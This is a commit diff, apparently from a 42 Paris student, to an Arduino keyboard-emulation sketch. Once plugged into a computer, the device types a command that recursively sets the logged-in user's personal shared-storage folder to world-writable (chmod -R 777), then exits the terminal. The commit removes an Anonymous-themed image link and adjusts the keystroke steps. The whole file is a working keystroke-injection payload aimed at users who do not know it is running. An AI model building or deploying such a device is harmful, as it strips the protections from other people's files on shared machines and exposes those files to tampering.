1f1a1e9c53298e046da460f59423a5279ee194ce
Adrien Chaisneau <achaisne@f2r2s7.clusters.42paris.fr>
2026-02-25 15:41:51 +0100

    42 compatibility

--- chmod.c
+++ chmod.c
@@ -11,8 +11,6 @@
 
 #include <Keyboard.h>
 
-const char *IMAGE_URL = "https://www.radiofrance.fr/s3/cruiser-production/2022/03/ad4f2532-60ed-4868-8079-741be4a86571/1200x680_075_porzycki-anonymou220301_npjji.jpg";
-
 void typeLine(const char *text) {
   Keyboard.print(text);
   Keyboard.write(KEY_RETURN);
@@ -36,24 +34,16 @@ void setup() {
 
   // Switch input source (GNOME default: Super+Space) to US layout.
   // Make sure US layout is added in GNOME input sources.
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press(' ');
-  delay(100);
-  Keyboard.releaseAll();
-  delay(300);
+  // Keyboard.press(KEY_LEFT_GUI);
+  // Keyboard.press(' ');
+  // delay(100);
+  // Keyboard.releaseAll();
+  // delay(300);
 
   // Run chmod 777 recursively on the path with whoami result
   typeLine("chmod -R 777 /sgoinfre/goinfre/Perso/$(whoami)");
-  delay(500);
-
-  // Wait for the commands to complete
-  delay(1000);
-
-  // Close the terminal
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(KEY_F4);
-  delay(100);
   Keyboard.releaseAll();
+  typeLine("exit");
 
   Keyboard.end();
 }
